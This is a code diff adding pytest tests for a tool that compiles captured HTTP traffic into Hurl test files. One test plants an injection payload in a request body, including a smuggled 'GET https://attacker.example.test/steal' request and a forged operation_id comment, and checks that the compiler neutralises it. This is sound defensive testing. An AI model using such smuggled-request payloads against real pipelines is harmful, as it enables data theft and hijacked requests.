@@ -13,6 +13,7 @@ from entroping.bridge.traffic_to_hurl import (
     TrafficHurlCompilationError,
     compile_traffic_session_to_hurl,
 )
+from entroping.models.hurl import parse_hurl_exchanges, parse_hurl_metadata
 from entroping.models.traffic import TrafficBody, TrafficExchange, TrafficRequest, TrafficResponse
 
 
@@ -154,6 +155,44 @@ def test_compile_traffic_session_rejects_hurl_template_delimiters_in_body() -> N
 
     with pytest.raises(TrafficHurlCompilationError, match="traffic body contains Hurl template"):
         compile_traffic_session_to_hurl(session, golden=False)
+
+
+def test_compile_traffic_session_request_body_is_inert_hurl_data() -> None:
+    exchange = _exchange(
+        request_body=(
+            '{"cart_id":"cart-1"}\n'
+            "GET https://attacker.example.test/steal\n"
+            "HTTP 200\n"
+            "[Asserts]\n"
+            "# entroping: operation_id=hijacked\n"
+        ),
+    )
+    session = TrafficSessionCandidate(
+        name="body_injection",
+        target_origin=None,
+        records=(TrafficSessionRecord(exchange=exchange, role="observed"),),
+    )
+
+    generated = compile_traffic_session_to_hurl(session, golden=False)
+
+    assert len(parse_hurl_exchanges(generated.content)) == 1
+    assert parse_hurl_metadata(generated.content).operation_id is None
+    assert "GET https://attacker.example.test/steal" not in generated.content
+    assert "base64," in generated.content
+
+
+def test_compile_traffic_session_keeps_benign_json_array_body_readable() -> None:
+    exchange = _exchange(request_body='["cart-1"]')
+    session = TrafficSessionCandidate(
+        name="json_array",
+        target_origin=None,
+        records=(TrafficSessionRecord(exchange=exchange, role="observed"),),
+    )
+
+    generated = compile_traffic_session_to_hurl(session, golden=False)
+
+    assert '["cart-1"]' in generated.content
+    assert "base64," not in generated.content
 
 
 def test_compile_traffic_session_skips_non_finite_golden_values() -> None:
